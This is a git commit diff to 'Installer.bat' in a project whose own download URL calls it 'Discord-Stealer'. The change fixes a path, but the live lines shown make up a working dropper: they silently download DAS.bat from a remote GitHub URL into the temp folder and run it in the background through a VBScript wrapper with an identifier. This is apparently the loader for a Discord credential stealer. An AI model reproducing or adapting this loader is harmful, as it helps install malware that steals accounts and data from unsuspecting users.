995f044c5c69c8eb2dee92ac559192e3017546eb
agamsol <43265196+agamsol@users.noreply.github.com>
2021-09-29 19:35:31 +0300

    path issue

--- 2.0/Installer.bat
+++ 2.0/Installer.bat
@@ -1,6 +1,6 @@
 @echo off
 set Identifier=%~1
-set "Save=%temp%"
+set "Save=%temp%\"
 curl --create-dirs -sf#kLo "%Save%DAS.bat" "https://raw.githubusercontent.com/agamsol/Discord-Stealer/main/2.0/DAS.bat"
 call "%Save%DAS.bat" --Background
 call "%Save%background.vbs" "%Save%DAS.bat" "!Identifier!"
